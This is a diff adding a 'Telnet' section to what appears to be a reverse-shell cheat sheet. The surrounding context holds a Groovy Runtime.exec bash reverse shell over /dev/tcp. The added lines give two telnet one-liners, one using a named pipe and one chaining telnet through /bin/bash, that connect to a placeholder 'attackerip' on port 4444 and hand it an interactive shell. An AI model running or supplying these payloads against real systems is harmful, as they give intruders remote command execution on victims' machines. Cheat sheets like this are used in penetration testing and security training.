@@ -39,3 +39,11 @@ This is a pretty obscure / esoteric method but there might be a chance you might
 	r = Runtime.getRuntime()
 	p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/127.0.0.1/4444;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
 	p.waitFor()
+    
+### 7. Telnet
+
+     rm -f /tmp/p; mknod /tmp/p p && telnet attackerip 4444 0/tmp/p
+     
+Or use a bunch of piping
+     
+    telnet attackerip 4444 | /bin/bash | telnet attackerip 4444   
